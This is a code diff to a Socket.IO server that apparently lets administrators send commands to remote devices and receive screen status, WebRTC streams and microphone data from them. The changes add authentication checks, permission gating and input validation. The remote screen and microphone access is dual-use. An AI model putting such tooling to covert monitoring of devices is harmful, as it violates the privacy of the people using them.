@@ -25,6 +25,20 @@ interface TransferChunk {
 
 type SocketAck = (response: { success: boolean; error?: string }) => void;
 
+const REALTIME_COMMANDS = new Set<CmdType>([
+  CMD.SCREEN,
+  CMD.SCREEN_CTRL,
+  CMD.WEBRTC_OFFER,
+  CMD.WEBRTC_ANSWER,
+  CMD.WEBRTC_ICE,
+]);
+
+const SESSION_ID_PATTERN = /^[A-Za-z0-9._:-]{1,128}$/;
+
+function readSessionId(value: unknown): string | null {
+  return typeof value === 'string' && SESSION_ID_PATTERN.test(value) ? value : null;
+}
+
 class SocketService {
   private io!: SocketIOServer;
   private fastifyApp!: FastifyInstance;
@@ -65,6 +79,9 @@ class SocketService {
 
       const clientToken = socket.handshake.query.token as string || socket.handshake.auth?.token as string;
       const deviceSecret = getConfig().security.deviceSecret;
+      if (!deviceSecret && process.env.NODE_ENV === 'production') {
+        return next(new Error('Device authentication is not configured'));
+      }
       if (deviceSecret && clientToken !== deviceSecret) {
         return next(new Error('Invalid device authentication token'));
       }
@@ -87,6 +104,11 @@ class SocketService {
   private handleAdminConnection(socket: Socket): void {
     socket.join('admin');
     socket.on('screen:subscribe', (payload: { id?: string }) => {
+      const user = (socket as any).user;
+      if (!user?.permissions?.includes('device:screen')) {
+        socket.emit('screen:error', { id: payload?.id || '', error: 'Insufficient screen permission' });
+        return;
+      }
       if (typeof payload?.id === 'string' && payload.id.length > 0 && payload.id.length <= 256) {
         socket.join(`screen:${payload.id}`);
       }
@@ -542,32 +564,27 @@ class SocketService {
       } catch (err: unknown) { log.error(`Mic handler error: ${err instanceof Error ? err.message : String(err)}`); }
     });
 
-    // Screen capture: relay frames directly to admin (no DB persistence)
+    // WebRTC screen state only. Video bypasses Node and uses P2P/TURN.
     socket.on(CMD.SCREEN, (data: any) => {
       try {
-        if (data.type === 'frame' && data.frame) {
-          // Relay frame directly to admin — not persisted
-          this.io.to(`screen:${id}`).emit('screen:frame', {
-            id,
-            frame: data.frame,
-            sequence: data.sequence,
-          });
-        } else if (data.type === 'status') {
+        if (data.type === 'status') {
           this.io.to(`screen:${id}`).emit('screen:status', {
             id,
             streaming: data.streaming,
             screenWidth: data.screenWidth,
             screenHeight: data.screenHeight,
+            captureWidth: data.captureWidth,
+            captureHeight: data.captureHeight,
             densityDpi: data.densityDpi,
             fps: data.fps,
-            quality: data.quality,
             accessible: data.accessible,
-            codec: data.codec,
-            frameTransport: data.frameTransport,
+            transport: data.transport,
+            connectionState: data.connectionState,
+            sessionId: data.sessionId,
           });
           broadcastData('screen');
         } else if (data.type === 'error' && data.error) {
-          this.io.to(`screen:${id}`).emit('screen:error', { id, error: data.error });
+          this.io.to(`screen:${id}`).emit('screen:error', { id, sessionId: data.sessionId, error: data.error });
           dbHelpers.addLog('ERROR', 'SCREEN', `Screen error from ${id}: ${data.error}`);
         }
       } catch (err: unknown) { log.error(`Screen handler error: ${err instanceof Error ? err.message : String(err)}`); }
@@ -621,13 +638,28 @@ class SocketService {
     // WebRTC Signaling (Device -> Admin)
     socket.on(CMD.WEBRTC_ANSWER, (data: any) => {
       try {
-        this.io.to('admin').emit('webrtc:answer', { id, sdp: data.sdp });
+        const sessionId = readSessionId(data?.sessionId);
+        if (!sessionId || typeof data?.sdp !== 'string' || data.sdp.length === 0 || data.sdp.length > 2_000_000) return;
+        this.io.to(`screen:${id}`).emit('webrtc:answer', {
+          id, sessionId, sdp: data.sdp,
+        });
       } catch (err: unknown) { log.error(`WebRTC Answer error: ${err instanceof Error ? err.message : String(err)}`); }
     });
 
     socket.on(CMD.WEBRTC_ICE, (data: any) => {
       try {
-        this.io.to('admin').emit('webrtc:ice', { id, candidate: data.candidate, sdpMid: data.sdpMid, sdpMLineIndex: data.sdpMLineIndex });
+        const sessionId = readSessionId(data?.sessionId);
+        if (!sessionId || typeof data?.candidate !== 'string' || data.candidate.length === 0 || data.candidate.length > 16_384) return;
+        const sdpMLineIndex = Number.isInteger(data.sdpMLineIndex) && data.sdpMLineIndex >= 0
+          ? data.sdpMLineIndex
+          : 0;
+        this.io.to(`screen:${id}`).emit('webrtc:ice', {
+          id,
+          sessionId,
+          candidate: data.candidate,
+          sdpMid: typeof data.sdpMid === 'string' ? data.sdpMid : null,
+          sdpMLineIndex,
+        });
       } catch (err: unknown) { log.error(`WebRTC ICE error: ${err instanceof Error ? err.message : String(err)}`); }
     });
   }
@@ -636,9 +668,11 @@ class SocketService {
     const socket = this.sockets.get(clientId);
     if (socket) {
       socket.emit('order', { type: cmd, ...params, timestamp: Date.now() });
-      dbHelpers.addLog('COMMAND', 'SOCKET', `Command ${cmd} sent to ${clientId}`, JSON.stringify(params));
+      const details = REALTIME_COMMANDS.has(cmd) ? undefined : JSON.stringify(params);
+      dbHelpers.addLog('COMMAND', 'SOCKET', `Command ${cmd} sent to ${clientId}`, details);
       return true;
     } else {
+      if (REALTIME_COMMANDS.has(cmd)) return false;
       this.queueCommand(clientId, cmd, params);
       dbHelpers.addLog('COMMAND', 'QUEUE', `Command ${cmd} queued for ${clientId}`, JSON.stringify(params));
       return false;
